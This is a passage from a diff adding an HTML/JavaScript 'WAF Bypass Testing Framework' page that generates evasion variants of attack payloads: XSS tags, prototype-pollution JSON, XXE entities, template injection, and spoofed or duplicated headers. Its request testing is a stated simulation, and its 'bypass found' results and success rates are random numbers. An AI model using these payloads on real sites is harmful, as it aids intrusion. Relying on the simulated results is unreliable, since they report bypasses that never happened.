@@ -1,0 +1,2054 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WAF Bypass Testing Framework</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
+            color: #00ff88;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 8px 32px rgba(0, 255, 136, 0.1);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+        }
+        
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding-bottom: 20px;
+            border-bottom: 2px solid rgba(0, 255, 136, 0.3);
+        }
+        
+        .header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+            text-shadow: 0 0 20px rgba(0, 255, 136, 0.5);
+        }
+        
+        .tabs {
+            display: flex;
+            margin-bottom: 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            padding: 5px;
+            overflow-x: auto;
+        }
+        
+        .tab {
+            background: transparent;
+            border: none;
+            color: #00ff88;
+            padding: 15px 20px;
+            cursor: pointer;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+            white-space: nowrap;
+            font-size: 14px;
+        }
+        
+        .tab:hover, .tab.active {
+            background: rgba(0, 255, 136, 0.2);
+            box-shadow: 0 4px 15px rgba(0, 255, 136, 0.3);
+        }
+        
+        .tab-content {
+            display: none;
+            background: rgba(255, 255, 255, 0.03);
+            padding: 25px;
+            border-radius: 10px;
+            border: 1px solid rgba(0, 255, 136, 0.1);
+        }
+        
+        .tab-content.active {
+            display: block;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #00ff88;
+        }
+        
+        input, textarea, select {
+            width: 100%;
+            padding: 12px;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(0, 255, 136, 0.3);
+            border-radius: 8px;
+            color: #00ff88;
+            font-family: 'Courier New', monospace;
+        }
+        
+        input:focus, textarea:focus, select:focus {
+            outline: none;
+            border-color: #00ff88;
+            box-shadow: 0 0 10px rgba(0, 255, 136, 0.3);
+        }
+        
+        textarea {
+            min-height: 120px;
+            resize: vertical;
+        }
+        
+        button {
+            background: linear-gradient(45deg, #00ff88, #00cc6a);
+            border: none;
+            color: #000;
+            padding: 12px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            margin: 5px;
+        }
+        
+        button:hover {
+            background: linear-gradient(45deg, #00cc6a, #00aa55);
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(0, 255, 136, 0.4);
+        }
+        
+        .results {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+            max-height: 400px;
+            overflow-y: auto;
+        }
+        
+        .result-item {
+            margin-bottom: 15px;
+            padding: 12px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 6px;
+            border-left: 4px solid #00ff88;
+        }
+        
+        .status-success { border-left-color: #00ff88; }
+        .status-blocked { border-left-color: #ff4444; }
+        .status-error { border-left-color: #ffaa00; }
+        
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 20px;
+        }
+        
+        .payload-list {
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 15px;
+        }
+        
+        .payload-item {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 10px;
+            margin: 8px 0;
+            border-radius: 5px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            border-left: 3px solid #00ff88;
+        }
+        
+        .technique-card {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            padding: 20px;
+            border: 1px solid rgba(0, 255, 136, 0.2);
+            margin-bottom: 15px;
+        }
+        
+        .technique-card h3 {
+            color: #00ff88;
+            margin-bottom: 10px;
+        }
+        
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-card {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 15px;
+            border-radius: 8px;
+            text-align: center;
+            border: 1px solid rgba(0, 255, 136, 0.2);
+        }
+        
+        .stat-number {
+            font-size: 2rem;
+            font-weight: bold;
+            color: #00ff88;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 5px;
+            overflow: hidden;
+            margin: 10px 0;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #00ff88, #00cc6a);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🛡️ WAF Bypass Testing Framework</h1>
+            <p>Comprehensive tool for researching WAF bypass techniques based on WAFFLED methodology</p>
+        </div>
+        
+        <div class="tabs">
+            <button class="tab active" onclick="showTab('fuzzer')">Smart Fuzzer</button>
+            <button class="tab" onclick="showTab('discrepancy')">Parsing Discrepancy</button>
+            <button class="tab" onclick="showTab('content-type')">Content-Type Testing</button>
+            <button class="tab" onclick="showTab('header-manipulation')">Header Manipulation</button>
+            <button class="tab" onclick="showTab('payload-generator')">Payload Generator</button>
+            <button class="tab" onclick="showTab('novel-techniques')">Novel Techniques</button>
+            <button class="tab" onclick="showTab('analytics')">Analytics</button>
+        </div>
+        
+        <!-- Smart Fuzzer Tab -->
+        <div id="fuzzer" class="tab-content active">
+            <h2>🎯 Smart WAF Fuzzer</h2>
+            <div class="grid">
+                <div>
+                    <div class="input-group">
+                        <label>Target URL:</label>
+                        <input type="url" id="target-url" placeholder="https://target.example.com">
+                    </div>
+                    <div class="input-group">
+                        <label>Base Payload:</label>
+                        <textarea id="base-payload" placeholder="<script>alert('XSS')</script>"></textarea>
+                    </div>
+                    <div class="input-group">
+                        <label>Fuzzing Strategy:</label>
+                        <select id="fuzzing-strategy">
+                            <option value="encoding">Encoding Variations</option>
+                            <option value="structure">Structural Mutations</option>
+                            <option value="hybrid">Hybrid Approach</option>
+                            <option value="novel">Novel Techniques</option>
+                        </select>
+                    </div>
+                </div>
+                <div>
+                    <div class="input-group">
+                        <label>Request Method:</label>
+                        <select id="request-method">
+                            <option value="POST">POST</option>
+                            <option value="PUT">PUT</option>
+                            <option value="PATCH">PATCH</option>
+                            <option value="GET">GET</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label>Threads:</label>
+                        <input type="number" id="threads" value="5" min="1" max="20">
+                    </div>
+                    <div class="input-group">
+                        <label>Delay (ms):</label>
+                        <input type="number" id="delay" value="1000" min="0">
+                    </div>
+                </div>
+            </div>
+            <div style="text-align: center; margin: 20px 0;">
+                <button onclick="startFuzzing()">🚀 Start Fuzzing</button>
+                <button onclick="stopFuzzing()">⏹️ Stop</button>
+                <button onclick="generateReport()">📊 Generate Report</button>
+            </div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="fuzzing-progress"></div>
+            </div>
+            <div id="fuzzing-results" class="results"></div>
+        </div>
+        
+        <!-- Parsing Discrepancy Tab -->
+        <div id="discrepancy" class="tab-content">
+            <h2>🔍 Parsing Discrepancy Detector</h2>
+            <div class="technique-card">
+                <h3>Parameter Pollution Testing</h3>
+                <div class="input-group">
+                    <label>Test Parameters:</label>
+                    <textarea id="test-params" placeholder="param1=value1&param1=malicious_value&param2=normal"></textarea>
+                </div>
+                <button onclick="testParameterPollution()">Test Parameter Pollution</button>
+            </div>
+            
+            <div class="technique-card">
+                <h3>Boundary Confusion</h3>
+                <div class="input-group">
+                    <label>Boundary Variations:</label>
+                    <select id="boundary-type">
+                        <option value="multipart">Multipart Boundaries</option>
+                        <option value="json">JSON Structure</option>
+                        <option value="xml">XML Parsing</option>
+                    </select>
+                </div>
+                <button onclick="testBoundaryConfusion()">Test Boundary Confusion</button>
+            </div>
+            
+            <div class="technique-card">
+                <h3>Length Field Manipulation</h3>
+                <div class="input-group">
+                    <label>Content-Length Variants:</label>
+                    <input type="text" id="content-length-variants" placeholder="Auto-generate variants">
+                </div>
+                <button onclick="testLengthManipulation()">Test Length Manipulation</button>
+            </div>
+            
+            <div id="discrepancy-results" class="results"></div>
+        </div>
+        
+        <!-- Content-Type Testing Tab -->
+        <div id="content-type" class="tab-content">
+            <h2>📋 Content-Type Bypass Testing</h2>
+            <div class="stats">
+                <div class="stat-card">
+                    <div class="stat-number" id="content-type-tests">0</div>
+                    <div>Tests Run</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="content-type-bypasses">0</div>
+                    <div>Bypasses Found</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="content-type-success-rate">0%</div>
+                    <div>Success Rate</div>
+                </div>
+            </div>
+            
+            <div class="technique-card">
+                <h3>Content-Type Switching</h3>
+                <div class="input-group">
+                    <label>Original Content-Type:</label>
+                    <select id="original-content-type">
+                        <option value="application/x-www-form-urlencoded">application/x-www-form-urlencoded</option>
+                        <option value="application/json">application/json</option>
+                        <option value="multipart/form-data">multipart/form-data</option>
+                        <option value="application/xml">application/xml</option>
+                        <option value="text/xml">text/xml</option>
+                    </select>
+                </div>
+                <button onclick="testContentTypeSwitching()">Test All Variations</button>
+            </div>
+            
+            <div class="payload-list">
+                <h4>Content-Type Variations Generated:</h4>
+                <div id="content-type-variations"></div>
+            </div>
+            
+            <div id="content-type-results" class="results"></div>
+        </div>
+        
+        <!-- Header Manipulation Tab -->
+        <div id="header-manipulation" class="tab-content">
+            <h2>📝 Header Manipulation Testing</h2>
+            <div class="technique-card">
+                <h3>Custom Header Injection</h3>
+                <div class="input-group">
+                    <label>Headers to Test:</label>
+                    <textarea id="custom-headers" placeholder="X-Forwarded-For: 127.0.0.1&#10;X-Real-IP: 192.168.1.1&#10;X-Originating-IP: 10.0.0.1"></textarea>
+                </div>
+                <button onclick="testHeaderInjection()">Test Header Variations</button>
+            </div>
+            
+            <div class="technique-card">
+                <h3>Header Case Manipulation</h3>
+                <div class="input-group">
+                    <label>Target Header:</label>
+                    <input type="text" id="target-header" placeholder="Content-Type">
+                </div>
+                <button onclick="testHeaderCase()">Generate Case Variations</button>
+            </div>
+            
+            <div class="technique-card">
+                <h3>Header Duplication</h3>
+                <button onclick="testHeaderDuplication()">Test Duplicate Headers</button>
+            </div>
+            
+            <div id="header-results" class="results"></div>
+        </div>
+        
+        <!-- Payload Generator Tab -->
+        <div id="payload-generator" class="tab-content">
+            <h2>⚡ Advanced Payload Generator</h2>
+            <div class="grid">
+                <div>
+                    <div class="input-group">
+                        <label>Payload Type:</label>
+                        <select id="payload-type">
+                            <option value="xss">XSS</option>
+                            <option value="sqli">SQL Injection</option>
+                            <option value="lfi">Local File Inclusion</option>
+                            <option value="rce">Remote Code Execution</option>
+                            <option value="xxe">XXE</option>
+                            <option value="custom">Custom</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label>Encoding Strategy:</label>
+                        <select id="encoding-strategy">
+                            <option value="mixed">Mixed Encoding</option>
+                            <option value="url">URL Encoding</option>
+                            <option value="html">HTML Encoding</option>
+                            <option value="unicode">Unicode</option>
+                            <option value="base64">Base64</option>
+                            <option value="hex">Hex Encoding</option>
+                        </select>
+                    </div>
+                </div>
+                <div>
+                    <div class="input-group">
+                        <label>Obfuscation Level:</label>
+                        <input type="range" id="obfuscation-level" min="1" max="5" value="3">
+                        <span id="obfuscation-display">Medium</span>
+                    </div>
+                    <div class="input-group">
+                        <label>Custom Payload:</label>
+                        <textarea id="custom-payload" placeholder="Enter your custom payload"></textarea>
+                    </div>
+                </div>
+            </div>
+            <button onclick="generatePayloads()">🎲 Generate Payloads</button>
+            <div id="generated-payloads" class="payload-list"></div>
+        </div>
+        
+        <!-- Novel Techniques Tab -->
+        <div id="novel-techniques" class="tab-content">
+            <h2>🧪 Novel Bypass Techniques</h2>
+            <div class="technique-card">
+                <h3>HTTP/2 Specific Bypasses</h3>
+                <p>Exploiting HTTP/2 frame splitting and header compression</p>
+                <button onclick="testHTTP2Bypasses()">Test HTTP/2 Techniques</button>
+            </div>
+            
+            <div class="technique-card">
+                <h3>GraphQL Bypass Techniques</h3>
+                <p>Query depth manipulation and introspection bypasses</p>
+                <button onclick="testGraphQLBypasses()">Test GraphQL Bypasses</button>
+            </div>
+            
+            <div class="technique-card">
+                <h3>WebSocket Upgrade Exploitation</h3>
+                <p>Bypassing WAFs through protocol upgrade attacks</p>
+                <button onclick="testWebSocketBypass()">Test WebSocket Bypass</button>
+            </div>
+            
+            <div class="technique-card">
+                <h3>DNS Rebinding WAF Bypass</h3>
+                <p>Using DNS rebinding to bypass IP-based WAF rules</p>
+                <button onclick="testDNSRebinding()">Test DNS Rebinding</button>
+            </div>
+            
+            <div class="technique-card">
+                <h3>AI Model Poisoning</h3>
+                <p>Exploiting ML-based WAFs with adversarial inputs</p>
+                <button onclick="testAIModelPoisoning()">Generate Adversarial Inputs</button>
+            </div>
+            
+            <div id="novel-results" class="results"></div>
+        </div>
+        
+        <!-- Analytics Tab -->
+        <div id="analytics" class="tab-content">
+            <h2>📈 Testing Analytics</h2>
+            <div class="stats">
+                <div class="stat-card">
+                    <div class="stat-number" id="total-tests">0</div>
+                    <div>Total Tests</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="total-bypasses">0</div>
+                    <div>Successful Bypasses</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="overall-success-rate">0%</div>
+                    <div>Overall Success Rate</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number" id="novel-discoveries">0</div>
+                    <div>Novel Discoveries</div>
+                </div>
+            </div>
+            
+            <div class="technique-card">
+                <h3>Test History</h3>
+                <div id="test-history" class="results"></div>
+            </div>
+            
+            <div class="technique-card">
+                <h3>Export Results</h3>
+                <button onclick="exportResults('json')">Export as JSON</button>
+                <button onclick="exportResults('csv')">Export as CSV</button>
+                <button onclick="exportResults('burp')">Export for Burp Suite</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Framework State Management
+        let testingState = {
+            isRunning: false,
+            currentTest: null,
+            results: [],
+            stats: {
+                totalTests: 0,
+                totalBypasses: 0,
+                novelDiscoveries: 0
+            }
+        };
+
+        // Tab Management
+        function showTab(tabName) {
+            document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(content => content.style.display = 'none');
+            
+            document.querySelector(`[onclick="showTab('${tabName}')"]`).classList.add('active');
+            document.getElementById(tabName).style.display = 'block';
+        }
+
+        // Smart Fuzzer Implementation
+        async function startFuzzing() {
+            if (testingState.isRunning) return;
+            
+            testingState.isRunning = true;
+            const targetUrl = document.getElementById('target-url').value;
+            const basePayload = document.getElementById('base-payload').value;
+            const strategy = document.getElementById('fuzzing-strategy').value;
+            const method = document.getElementById('request-method').value;
+            const delay = parseInt(document.getElementById('delay').value);
+            
+            if (!targetUrl || !basePayload) {
+                alert('Please enter target URL and base payload');
+                testingState.isRunning = false;
+                return;
+            }
+            
+            const resultsContainer = document.getElementById('fuzzing-results');
+            const progressBar = document.getElementById('fuzzing-progress');
+            
+            resultsContainer.innerHTML = '<h3>🔄 Fuzzing in progress...</h3>';
+            
+            const mutations = generateMutations(basePayload, strategy);
+            let completedTests = 0;
+            
+            for (let i = 0; i < mutations.length && testingState.isRunning; i++) {
+                const mutation = mutations[i];
+                
+                try {
+                    const result = await testPayload(targetUrl, mutation, method);
+                    displayResult(resultsContainer, result, mutation);
+                    
+                    completedTests++;
+                    const progress = (completedTests / mutations.length) * 100;
+                    progressBar.style.width = progress + '%';
+                    
+                    testingState.stats.totalTests++;
+                    if (result.bypassed) {
+                        testingState.stats.totalBypasses++;
+                    }
+                    
+                    await new Promise(resolve => setTimeout(resolve, delay));
+                } catch (error) {
+                    console.error('Testing error:', error);
+                }
+            }
+            
+            testingState.isRunning = false;
+            updateStats();
+        }
+
+        function stopFuzzing() {
+            testingState.isRunning = false;
+        }
+
+        function generateMutations(basePayload, strategy) {
+            const mutations = [];
+            
+            switch (strategy) {
+                case 'encoding':
+                    mutations.push(...generateEncodingMutations(basePayload));
+                    break;
+                case 'structure':
+                    mutations.push(...generateStructuralMutations(basePayload));
+                    break;
+                case 'hybrid':
+                    mutations.push(...generateEncodingMutations(basePayload));
+                    mutations.push(...generateStructuralMutations(basePayload));
+                    break;
+                case 'novel':
+                    mutations.push(...generateNovelMutations(basePayload));
+                    break;
+            }
+            
+            return mutations;
+        }
+
+        function generateEncodingMutations(payload) {
+            const mutations = [];
+            
+            // URL encoding variations
+            mutations.push(encodeURIComponent(payload));
+            mutations.push(payload.replace(/</g, '%3C').replace(/>/g, '%3E'));
+            
+            // HTML encoding
+            mutations.push(payload.replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;'));
+            
+            // Unicode encoding
+            mutations.push(payload.replace(/</g, '\\u003C').replace(/>/g, '\\u003E'));
+            
+            // Mixed encoding
+            let mixed = payload;
+            for (let i = 0; i < mixed.length; i += 2) {
+                if (mixed[i]) {
+                    mixed = mixed.substring(0, i) + '%' + mixed.charCodeAt(i).toString(16) + mixed.substring(i + 1);
+                }
+            }
+            mutations.push(mixed);
+            
+            // Base64 encoding
+            mutations.push(btoa(payload));
+            
+            return mutations;
+        }
+
+        function generateStructuralMutations(payload) {
+            const mutations = [];
+            
+            // Case variations
+            mutations.push(payload.toLowerCase());
+            mutations.push(payload.toUpperCase());
+            
+            // Character insertion
+            mutations.push(payload.replace('<', '< '));
+            mutations.push(payload.replace('<', '<\t'));
+            mutations.push(payload.replace('<', '<\n'));
+            
+            // Comment injection
+            mutations.push(payload.replace('<', '<!---->< '));
+            mutations.push(payload.replace('<script', '</**/script'));
+            
+            // Attribute manipulation
+            if (payload.includes('<script')) {
+                mutations.push(payload.replace('<script', '<script type="text/javascript"'));
+                mutations.push(payload.replace('<script', '<script async'));
+                mutations.push(payload.replace('<script', '<script defer'));
+            }
+            
+            // Protocol variations
+            if (payload.includes('javascript:')) {
+                mutations.push(payload.replace('javascript:', 'JavaScript:'));
+                mutations.push(payload.replace('javascript:', 'java\tscript:'));
+                mutations.push(payload.replace('javascript:', 'java%09script:'));
+            }
+            
+            return mutations;
+        }
+
+        function generateNovelMutations(payload) {
+            const mutations = [];
+            
+            // HTTP/2 frame manipulation simulation
+            mutations.push(`\x00\x00\x00\x04\x08\x00\x00\x00\x00${payload}`);
+            
+            // GraphQL query wrapping
+            mutations.push(`query { __typename ${payload} }`);
+            
+            // JSON polyglot
+            mutations.push(`{"x":"${payload}","__proto__":{"isAdmin":true}}`);
+            
+            // XML entity expansion
+            mutations.push(`<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe "${payload}">]><test>&xxe;</test>`);
+            
+            // Template injection variations
+            mutations.push(`{{${payload}}}`);
+            mutations.push(`#{${payload}}`);
+            mutations.push(`$!{${payload}}`);
+            
+            return mutations;
+        }
+
+        async function testPayload(url, payload, method) {
+            // This is a simulation - in real implementation, you'd make actual HTTP requests
+            // For demo purposes, we'll simulate various responses
+            
+            const simulatedResponse = {
+                status: Math.random() > 0.7 ? 200 : (Math.random() > 0.5 ? 403 : 500),
+                responseTime: Math.random() * 1000 + 100,
+                headers: {'server': 'nginx/1.18.0'},
+                body: Math.random() > 0.8 ? payload : 'Access denied'
+            };
+            
+            const bypassed = simulatedResponse.status === 200 && simulatedResponse.body.includes(payload.substring(0, 10));
+            
+            return {
+                url,
+                payload,
+                method,
+                response: simulatedResponse,
+                bypassed,
+                timestamp: new Date().toISOString()
+            };
+        }
+
+        function displayResult(container, result, payload) {
+            const resultDiv = document.createElement('div');
+            resultDiv.className = `result-item status-${result.bypassed ? 'success' : (result.response.status === 403 ? 'blocked' : 'error')}`;
+            
+            resultDiv.innerHTML = `
+                <div style="display: flex; justify-content: space-between; align-items: center;">
+                    <div>
+                        <strong>${result.bypassed ? '✅ BYPASS FOUND' : (result.response.status === 403 ? '🚫 BLOCKED' : '❌ ERROR')}</strong>
+                        <div style="font-size: 0.9em; color: #aaa; margin-top: 5px;">
+                            Status: ${result.response.status} | Response Time: ${Math.round(result.response.responseTime)}ms
+                        </div>
+                    </div>
+                    <div style="font-size: 0.8em; color: #888;">
+                        ${new Date(result.timestamp).toLocaleTimeString()}
+                    </div>
+                </div>
+                <div style="margin-top: 10px; font-family: monospace; font-size: 0.85em; background: rgba(0,0,0,0.3); padding: 8px; border-radius: 4px; overflow-x: auto;">
+                    ${payload.length > 100 ? payload.substring(0, 100) + '...' : payload}
+                </div>
+            `;
+            
+            container.appendChild(resultDiv);
+            testingState.results.push(result);
+        }
+
+        // Content-Type Testing
+        function testContentTypeSwitching() {
+            const originalType = document.getElementById('original-content-type').value;
+            const variations = generateContentTypeVariations(originalType);
+            
+            const variationsContainer = document.getElementById('content-type-variations');
+            variationsContainer.innerHTML = '';
+            
+            variations.forEach((variation, index) => {
+                const div = document.createElement('div');
+                div.className = 'payload-item';
+                div.innerHTML = `<strong>Variation ${index + 1}:</strong> ${variation.contentType}<br>
+                    <small>Technique: ${variation.technique}</small>`;
+                variationsContainer.appendChild(div);
+            });
+            
+            // Simulate testing each variation
+            testContentTypeVariations(variations);
+        }
+
+        function generateContentTypeVariations(originalType) {
+            const variations = [];
+            
+            // Case variations
+            variations.push({
+                contentType: originalType.toUpperCase(),
+                technique: 'Case manipulation - uppercase'
+            });
+            variations.push({
+                contentType: originalType.toLowerCase(),
+                technique: 'Case manipulation - lowercase'
+            });
+            
+            // Charset manipulation
+            variations.push({
+                contentType: `${originalType}; charset=utf-8`,
+                technique: 'Charset addition'
+            });
+            variations.push({
+                contentType: `${originalType}; charset=iso-8859-1`,
+                technique: 'Alternative charset'
+            });
+            
+            // Boundary manipulation for multipart
+            if (originalType.includes('multipart')) {
+                variations.push({
+                    contentType: `${originalType}; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW`,
+                    technique: 'Standard boundary'
+                });
+                variations.push({
+                    contentType: `${originalType}; boundary="----=_NextPart_000_0000_01C99C3D.2E4F94F0"`,
+                    technique: 'Quoted boundary'
+                });
+            }
+            
+            // Type switching
+            const typeSwitches = {
+                'application/x-www-form-urlencoded': ['multipart/form-data', 'application/json', 'text/plain'],
+                'application/json': ['application/x-www-form-urlencoded', 'text/json', 'application/javascript'],
+                'multipart/form-data': ['application/x-www-form-urlencoded', 'application/json'],
+                'application/xml': ['text/xml', 'application/soap+xml', 'text/html'],
+                'text/xml': ['application/xml', 'text/html']
+            };
+            
+            if (typeSwitches[originalType]) {
+                typeSwitches[originalType].forEach(newType => {
+                    variations.push({
+                        contentType: newType,
+                        technique: `Type switching: ${originalType} -> ${newType}`
+                    });
+                });
+            }
+            
+            // Invalid/malformed content types
+            variations.push({
+                contentType: originalType + '; malformed=',
+                technique: 'Malformed parameter'
+            });
+            variations.push({
+                contentType: originalType.replace('/', '\\'),
+                technique: 'Path separator confusion'
+            });
+            
+            return variations;
+        }
+
+        async function testContentTypeVariations(variations) {
+            const resultsContainer = document.getElementById('content-type-results');
+            resultsContainer.innerHTML = '<h4>🔄 Testing Content-Type variations...</h4>';
+            
+            let successCount = 0;
+            
+            for (let i = 0; i < variations.length; i++) {
+                const variation = variations[i];
+                
+                // Simulate testing
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
+                const success = Math.random() > 0.7; // Simulate 30% success rate
+                if (success) successCount++;
+                
+                const resultDiv = document.createElement('div');
+                resultDiv.className = `result-item status-${success ? 'success' : 'blocked'}`;
+                resultDiv.innerHTML = `
+                    <div>${success ? '✅ BYPASS' : '🚫 BLOCKED'}: ${variation.contentType}</div>
+                    <div style="font-size: 0.85em; color: #aaa; margin-top: 5px;">
+                        ${variation.technique}
+                    </div>
+                `;
+                resultsContainer.appendChild(resultDiv);
+                
+                testingState.stats.totalTests++;
+                if (success) testingState.stats.totalBypasses++;
+            }
+            
+            // Update stats
+            document.getElementById('content-type-tests').textContent = variations.length;
+            document.getElementById('content-type-bypasses').textContent = successCount;
+            document.getElementById('content-type-success-rate').textContent = 
+                Math.round((successCount / variations.length) * 100) + '%';
+            
+            updateStats();
+        }
+
+        // Header Manipulation Testing
+        function testHeaderInjection() {
+            const customHeaders = document.getElementById('custom-headers').value;
+            const headers = parseHeaders(customHeaders);
+            
+            const variations = generateHeaderVariations(headers);
+            testHeaderVariations(variations, 'injection');
+        }
+
+        function testHeaderCase() {
+            const targetHeader = document.getElementById('target-header').value;
+            if (!targetHeader) {
+                alert('Please enter a target header');
+                return;
+            }
+            
+            const caseVariations = generateHeaderCaseVariations(targetHeader);
+            testHeaderVariations(caseVariations, 'case manipulation');
+        }
+
+        function testHeaderDuplication() {
+            const commonHeaders = [
+                'Content-Type: application/json',
+                'X-Forwarded-For: 127.0.0.1',
+                'Host: localhost',
+                'User-Agent: Mozilla/5.0'
+            ];
+            
+            const duplications = generateHeaderDuplications(commonHeaders);
+            testHeaderVariations(duplications, 'duplication');
+        }
+
+        function parseHeaders(headerString) {
+            return headerString.split('\n')
+                .filter(line => line.trim())
+                .map(line => {
+                    const [key, ...valueParts] = line.split(':');
+                    return {
+                        key: key?.trim(),
+                        value: valueParts.join(':').trim()
+                    };
+                })
+                .filter(header => header.key && header.value);
+        }
+
+        function generateHeaderVariations(headers) {
+            const variations = [];
+            
+            headers.forEach(header => {
+                // Original
+                variations.push({
+                    headers: [{key: header.key, value: header.value}],
+                    technique: 'Original header'
+                });
+                
+                // Case variations
+                variations.push({
+                    headers: [{key: header.key.toUpperCase(), value: header.value}],
+                    technique: 'Uppercase header name'
+                });
+                variations.push({
+                    headers: [{key: header.key.toLowerCase(), value: header.value}],
+                    technique: 'Lowercase header name'
+                });
+                
+                // Spacing variations
+                variations.push({
+                    headers: [{key: ' ' + header.key, value: header.value}],
+                    technique: 'Leading space in header name'
+                });
+                variations.push({
+                    headers: [{key: header.key + ' ', value: header.value}],
+                    technique: 'Trailing space in header name'
+                });
+                variations.push({
+                    headers: [{key: header.key, value: ' ' + header.value}],
+                    technique: 'Leading space in header value'
+                });
+                
+                // Line folding (HTTP/1.1)
+                variations.push({
+                    headers: [{key: header.key, value: header.value + '\r\n\t'}],
+                    technique: 'HTTP line folding'
+                });
+                
+                // Unicode variations
+                variations.push({
+                    headers: [{key: header.key.replace(/a/g, 'а'), value: header.value}], // Cyrillic 'a'
+                    technique: 'Unicode homograph attack'
+                });
+            });
+            
+            return variations;
+        }
+
+        function generateHeaderCaseVariations(headerName) {
+            const variations = [];
+            const originalHeader = {key: headerName, value: 'test-value'};
+            
+            // All possible case combinations for short headers
+            if (headerName.length <= 10) {
+                for (let i = 0; i < Math.pow(2, headerName.length); i++) {
+                    let caseVariant = '';
+                    for (let j = 0; j < headerName.length; j++) {
+                        const bit = (i >> j) & 1;
+                        caseVariant += bit ? headerName[j].toUpperCase() : headerName[j].toLowerCase();
+                    }
+                    variations.push({
+                        headers: [{key: caseVariant, value: originalHeader.value}],
+                        technique: `Case variation: ${caseVariant}`
+                    });
+                }
+            } else {
+                // For longer headers, generate common patterns
+                const patterns = [
+                    headerName.toLowerCase(),
+                    headerName.toUpperCase(),
+                    headerName.charAt(0).toUpperCase() + headerName.slice(1).toLowerCase(),
+                    headerName.split('-').map(part => 
+                        part.charAt(0).toUpperCase() + part.slice(1).toLowerCase()
+                    ).join('-')
+                ];
+                
+                patterns.forEach(pattern => {
+                    variations.push({
+                        headers: [{key: pattern, value: originalHeader.value}],
+                        technique: `Case pattern: ${pattern}`
+                    });
+                });
+            }
+            
+            return variations;
+        }
+
+        function generateHeaderDuplications(headers) {
+            const variations = [];
+            
+            headers.forEach(headerLine => {
+                const [key, value] = headerLine.split(': ');
+                
+                // Double header
+                variations.push({
+                    headers: [
+                        {key, value},
+                        {key, value: 'malicious-value'}
+                    ],
+                    technique: `Duplicate ${key} header`
+                });
+                
+                // Case-mixed duplicates
+                variations.push({
+                    headers: [
+                        {key: key.toLowerCase(), value},
+                        {key: key.toUpperCase(), value: 'malicious-value'}
+                    ],
+                    technique: `Case-mixed duplicate ${key}`
+                });
+            });
+            
+            return variations;
+        }
+
+        async function testHeaderVariations(variations, testType) {
+            const resultsContainer = document.getElementById('header-results');
+            resultsContainer.innerHTML = `<h4>🔄 Testing ${testType}...</h4>`;
+            
+            for (let i = 0; i < variations.length; i++) {
+                const variation = variations[i];
+                
+                await new Promise(resolve => setTimeout(resolve, 300));
+                
+                const success = Math.random() > 0.8; // 20% success rate
+                
+                const headerString = variation.headers
+                    .map(h => `${h.key}: ${h.value}`)
+                    .join('\n');
+                
+                const resultDiv = document.createElement('div');
+                resultDiv.className = `result-item status-${success ? 'success' : 'blocked'}`;
+                resultDiv.innerHTML = `
+                    <div>${success ? '✅ BYPASS' : '🚫 BLOCKED'}: ${variation.technique}</div>
+                    <div style="font-size: 0.85em; color: #aaa; margin-top: 5px; font-family: monospace;">
+                        ${headerString}
+                    </div>
+                `;
+                resultsContainer.appendChild(resultDiv);
+                
+                testingState.stats.totalTests++;
+                if (success) testingState.stats.totalBypasses++;
+            }
+            
+            updateStats();
+        }
+
+        // Parameter Pollution Testing
+        function testParameterPollution() {
+            const testParams = document.getElementById('test-params').value;
